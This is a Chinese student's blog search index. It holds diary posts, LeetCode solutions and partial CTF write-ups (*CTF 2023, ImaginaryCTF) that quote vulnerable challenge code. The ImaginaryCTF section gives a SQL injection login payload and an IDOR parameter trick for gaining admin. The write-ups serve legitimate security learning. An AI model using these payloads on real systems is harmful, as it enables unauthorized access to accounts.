<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>简介</title>
    <url>/2023/01/13/%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p><b>欢迎！</b><br>这里是林涂！很高兴认识你！<br>本人间歇性发疯中。。。</p>
]]></content>
  </entry>
  <entry>
    <title>2023暑期学习week2</title>
    <url>/2023/07/28/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week4/</url>
    <content><![CDATA[<p>不知道week3的博客是犯了什么天条<br>github疯狂报错😅😅😅</p>
<hr>
<p>我是真崩溃啊试了个把时间设置在上个月7月的然后成功部署了，那为什么8月不行？啊？啊？啊？啊啊啊啊啊？？？？？？？？？？？？？？？？？？？？？？？？</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>_*CTF_2023_wp_部分</title>
    <url>/2023/07/28/xCTF-2023-wp-%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<p>*CTF。。坐等群u的wp。。。。</p>
<span id="more"></span>
<h1 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h1><p>不会，搜之（笑死，卡在第一步</p>
<p>access_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MjE1MDUzfQ.y8bvfxujzwVOmp856bxfGkT1AJUAoVUA9X9NTmiPkGg<br>{<br>  “typ”: “JWT”,<br>  “alg”: “HS256”<br>}<br>{<br>  “sub”: “user”,<br>  “exp”: 2006215053<br>}<br>{</p>
<p>}<br>查的一些资料，，<br><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<p><a href="https://www.freebuf.com/articles/web/254694.html">记一题关于JWT的CTF（hackergame 普通的身份认证器） - FreeBuf网络安全行业门户</a><br><a href="https://blog.csdn.net/miuzzx/article/details/111936737">CTFSHOW jwt篇</a><br><a href="https://blog.csdn.net/loseheart157/article/details/120852579">ctf-hub web进阶(JWT)</a><br><a href="https://blog.csdn.net/miuzzx/article/details/111936737">CTFSHOW jwt篇</a><br><a href="https://zhuanlan.zhihu.com/p/86937325">五分钟带你了解啥是JWT - 知乎</a><br><a href="https://zhuanlan.zhihu.com/p/135247813">一次关于jwt的尝试破解 - 知乎</a><br><a href="https://blog.csdn.net/hebing1022/article/details/89442992">一、Struts基本介绍和使用</a></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h2><p>谷歌识图，百度识图出不来<br>发现是<br><a href="https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93">Dovahkiin 字体</a></p>
<p>一一比对，结果这玩意不仅一个符号同时对应大小写，第三个符号还对应了两个字母————😡😡😡<br>试了半天发现题目有<code>AN ancient old language </code><br>可能就是告诉我们全大写吧，，浅浅test一下，成功了</p>
<p><a href="https://zhuanlan.zhihu.com/p/52693499">找图不求人！10个以图搜图的识图网站推荐 - 知乎</a></p>
<h2 id="MWM"><a href="#MWM" class="headerlink" title="MWM"></a>MWM</h2><p><code>pip install torchvision</code><br>运行py文件后大概在<code>C:\Users\用户名\.cache\torch\hub\checkpoints</code>的地方生成了个pth文件，看一眼好像是504B，改成zip解压缩看看，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data.pkl</span><br><span class="line">/version</span><br><span class="line">data</span><br><span class="line">   |-/140218745311664</span><br><span class="line">   |-/140218745311744</span><br><span class="line">   |-/140218745311824</span><br><span class="line">   |-...</span><br></pre></td></tr></table></figure>
<p>然后加载这个pickle文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;C:\\Users\\用户名\\.cache\\torch\\hub\\checkpoints\\resnet50-0676ba61\\archive\\data.pkl&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> pkl_file:</span><br><span class="line">    data = pkl_file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\用户名\\.cache\\torch\\hub\\checkpoints\\resnet50-0676ba61\\archive\\pickle_data.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        unpickled_data = pickletools.dis(data, out=output_file)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError <span class="keyword">as</span> e:</span><br><span class="line">        output_file.write(<span class="string">&quot;UnpicklingError: &quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="comment"># 这步其实只是为了看着方便。。。。</span></span><br></pre></td></tr></table></figure>
<p>然后有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0: \x80 PROTO      2</span><br><span class="line">    2: c    GLOBAL     &#x27;collections OrderedDict&#x27;</span><br><span class="line">   27: q    BINPUT     0</span><br><span class="line">   29: )    EMPTY_TUPLE</span><br><span class="line">   30: R    REDUCE</span><br><span class="line">   31: q    BINPUT     1</span><br><span class="line">   33: (    MARK</span><br><span class="line">   34: X        BINUNICODE &#x27;conv1.weight&#x27;</span><br><span class="line">   51: q        BINPUT     2</span><br><span class="line">   53: c        GLOBAL     &#x27;torch._utils _rebuild_parameter&#x27;</span><br><span class="line">   86: q        BINPUT     3</span><br><span class="line">   88: c        GLOBAL     &#x27;torch._utils _rebuild_tensor_v2&#x27;</span><br><span class="line">  121: q        BINPUT     4</span><br><span class="line">  123: (        MARK</span><br><span class="line">  124: (            MARK</span><br><span class="line">  125: X                BINUNICODE &#x27;storage&#x27;</span><br><span class="line">  137: q                BINPUT     5</span><br><span class="line">  139: c                GLOBAL     &#x27;torch FloatStorage&#x27;</span><br><span class="line">  159: q                BINPUT     6</span><br><span class="line">  161: X                BINUNICODE &#x27;140219039892448&#x27;</span><br><span class="line">  181: q                BINPUT     7</span><br><span class="line">  183: X                BINUNICODE &#x27;cpu&#x27;</span><br><span class="line">  191: q                BINPUT     8</span><br><span class="line">  193: M                BININT2    9408</span><br><span class="line">  196: t                TUPLE      (MARK at 124)</span><br><span class="line">  197: q            BINPUT     9</span><br><span class="line">  199: Q            BINPERSID</span><br><span class="line">  200: K            BININT1    0</span><br><span class="line">  202: (            MARK</span><br><span class="line">  203: K                BININT1    64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">35404: \x88     NEWTRUE</span><br><span class="line">35405: h        BINGET     0</span><br><span class="line">35407: )        EMPTY_TUPLE</span><br><span class="line">35408: R        REDUCE</span><br><span class="line">35409: r        LONG_BINPUT 2623</span><br><span class="line">35414: \x87     TUPLE3</span><br><span class="line">35415: r        LONG_BINPUT 2624</span><br><span class="line">35420: R        REDUCE</span><br><span class="line">35421: r        LONG_BINPUT 2625</span><br><span class="line">35426: u        SETITEMS   (MARK at 33)</span><br><span class="line">35427: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
<p>大概知道这道题是什么序列化什么反序列化吧。。。<br>然后我不知道为什么一直搞不出来那个pickle.load。。。反正就是溜了。。。坐等别人wp。。。</p>
<h2 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h2><p>学长给了个<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">frankthetank-music&#x2F;Acropalypse-Multi-Tool: Easily detect and restore Acropalypse vulnerable PNG and GIF files with simple Python GUI.</a><br>但是我cmd一直报错。。。<br>一开始以为是路径的问题<br><a href="https://blog.csdn.net/xyk198307/article/details/45317465">Python import .pyd 可能遇到路径的问题</a><br><a href="https://blog.csdn.net/Archuiyu/article/details/120148663">解决Python import .pyd 可能遇到路径的问题</a><br>后来发现可能是缺什么dll<br><a href="https://blog.csdn.net/AlanGuoo/article/details/103850509">ImportError: DLL load failed: 找不到指定的模块, 可能缺少VC ++ Redistributable Package</a><br>然后我安了dependencywalker之后发现少了PYTHON39.DLL和WPAXHOLDER.DLL还有些什么什么的<br>反正不太明白。。懒得搞了其实。。。有时间开虚拟机在虚拟机里可能快一点。。。</p>
<p>btw上网搜索的时候发现了个<a href="https://zhuanlan.zhihu.com/p/616249684">Windows 11 截图工具隐私错误暴露裁剪的图像内容 - 知乎</a>，里面大概是讲一些原理这样<br>然后我看到最底下评论今天十二点求脚本。。我有充分证据证明ta也在*ctf。。。</p>
<p>不学了做不出来好崩溃。。sstilabs去了。。。</p>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>imaginaryctf部分wp</title>
    <url>/2023/07/27/imaginaryctf%E9%83%A8%E5%88%86wp%EF%BC%88%E5%8F%AA%E6%9C%89%E4%B8%80%E7%82%B9%E7%82%B9%E3%80%82%E3%80%82/</url>
    <content><![CDATA[<p>只有一点点。。</p>
<span id="more"></span>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Idoriot"><a href="#Idoriot" class="headerlink" title="Idoriot"></a>Idoriot</h2><p>Source Code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if session is expired</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() &gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;expires&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: logout.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display user ID on landing page</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome, User ID: &quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the user for admin</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:memory:&#x27;</span>);</span><br><span class="line"><span class="variable">$admin</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;SELECT * FROM users WHERE user_id = 0 LIMIT 1&#x27;</span>)-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the user is admin</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$admin</span>[<span class="string">&#x27;user_id&#x27;</span>] === <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// Read the flag from flag.txt</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Flag&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;<span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Display the source code for this file</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>logout.php页面退出，在注册页面F12有<code>&lt;input type=&quot;hidden&quot; name=&quot;user_id&quot; value=&quot;830084615&quot;&gt;</code>，post个<code>password=1&amp;username=1&amp;user_id=0</code></p>
<h1 id="inspection"><a href="#inspection" class="headerlink" title="inspection"></a>inspection</h1><p>F12<br>位置大概在<br><code>/html/body/div[4]/div[2]/div[67]/div/div/div[2]/p[1]</code></p>
<h1 id="blank"><a href="#blank" class="headerlink" title="blank"></a>blank</h1><p>看源码，晕字，大概看出来<br>没过滤输入，<code>&quot;</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.<span class="title function_">get</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span> + username + <span class="string">&#x27;&quot; and password = &quot;&#x27;</span> + password+ <span class="string">&#x27;&quot;&#x27;</span>, <span class="function">(<span class="params">err, row</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error retrieving user&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (row) &#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">true</span>;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&#x27;Login successful!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid username or password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>检测了username</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span> == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Welcome admin. The flag is &#x27;</span> + fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">loggedIn</span>) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&#x27;You must be admin to get the flag.&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unauthorized. Please login first.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>所以username&#x3D;admin，只能在password注入</p>
<p><code>username=admin&amp;password=&quot; union select 1,2,3--</code></p>
<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>右键查看源代码<br>最下面有一行<code>/?source</code><br>加在url栏后有</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>] ?? <span class="string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$magic</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;MAGIC&#x27;</span>] ?? <span class="string">&#x27;aabbccdd11223344&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/db.sqlite3&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$magic</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> .= <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">querySingle</span>(<span class="string">&quot;SELECT username, pwhash FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$res</span>[<span class="string">&#x27;pwhash&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$u</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Welcome <span class="subst">$u</span>! But there is no flag here :P&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$msg</span> .= <span class="string">&quot;&lt;!-- magic: <span class="subst">$magic</span> --&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">    &lt;link type=<span class="string">&quot;text/css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.simplecss.org/simple.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;main&gt;</span><br><span class="line">        &lt;h2&gt;Login&lt;/h2&gt;</span><br><span class="line">        &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;Username&lt;/label&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> /&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;Password&lt;/label&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> /&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">            &lt;p&gt;</span><br><span class="line">                &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;Login&lt;/button&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            <span class="meta">&lt;?=</span> <span class="variable">$msg</span> <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br></pre></td></tr></table></figure>
<p>然后还在研究</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher_text = <span class="built_in">open</span>(<span class="string">r&quot;D:\xxx\flag.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">c = bytes_to_long(cipher_text)</span><br><span class="line">key1 = RSA.importKey(<span class="built_in">open</span>(<span class="string">r&quot;D:\xxx\private.pem&quot;</span>).read())</span><br><span class="line">key2 = RSA.importKey(<span class="built_in">open</span>(<span class="string">r&quot;D:\xxx\public.pem&quot;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,key1.d,key2.n)))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2023暑期学习week2</title>
    <url>/2023/07/25/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week2/</url>
    <content><![CDATA[<p>学个der。。。<br>是这样。。我把hexo配回来了。。。blog堂堂复活。。。</p>
<span id="more"></span>
<h1 id="imaginaryctf复现（只有一点点"><a href="#imaginaryctf复现（只有一点点" class="headerlink" title="imaginaryctf复现（只有一点点"></a>imaginaryctf复现（只有一点点</h1><p><a href="https://linturrr.github.io/2023/07/27/imaginaryctf%E9%83%A8%E5%88%86wp%EF%BC%88%E5%8F%AA%E6%9C%89%E4%B8%80%E7%82%B9%E7%82%B9%E3%80%82%E3%80%82/">imaginaryctf复现</a></p>
<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>想起来以前好像写过五题。。。<br><a href="http://linturrr.github.io/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/">xss学习做题wp</a></p>
<h1 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h1><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)</span><br><span class="line">                <span class="keyword">return</span> &#123;i, j&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="字母异位词分组"><a href="#字母异位词分组" class="headerlink" title="字母异位词分组"></a>字母异位词分组</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">groupAnagrams</span>(<span class="params">self, strs</span>):</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> strs:</span><br><span class="line">            fenlei = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(s))</span><br><span class="line">            <span class="keyword">if</span> fenlei <span class="keyword">not</span> <span class="keyword">in</span> hashtable:</span><br><span class="line">                hashtable[fenlei] = [s]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hashtable[fenlei].append(s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(hashtable.values())</span><br></pre></td></tr></table></figure>
<h2 id="最长连续序列"><a href="#最长连续序列" class="headerlink" title="最长连续序列"></a>最长连续序列</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestConsecutive</span>(<span class="params">self, nums</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hashtable = <span class="built_in">set</span>(nums)</span><br><span class="line">        ls = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> n - <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> hashtable:</span><br><span class="line">                i = n</span><br><span class="line">                <span class="keyword">while</span> i <span class="keyword">in</span> hashtable:</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                ls = <span class="built_in">max</span>(ls, i - n)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ls</span><br></pre></td></tr></table></figure>
<p>好像太慢了额,看了眼官方题解,虽然我觉得没差,但是或许系统会给点优待</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestConsecutive</span>(<span class="params">self, nums</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hashtable = <span class="built_in">set</span>(nums)</span><br><span class="line">        ls = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> n - <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> hashtable:</span><br><span class="line">                i = n</span><br><span class="line">                cs = <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> i + <span class="number">1</span>  <span class="keyword">in</span> hashtable:</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    cs += <span class="number">1</span></span><br><span class="line">                ls = <span class="built_in">max</span>(ls, cs)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ls</span><br></pre></td></tr></table></figure>
<p>挺好的,更慢了(眼神死)<br>抄个佬的研究一下</p>
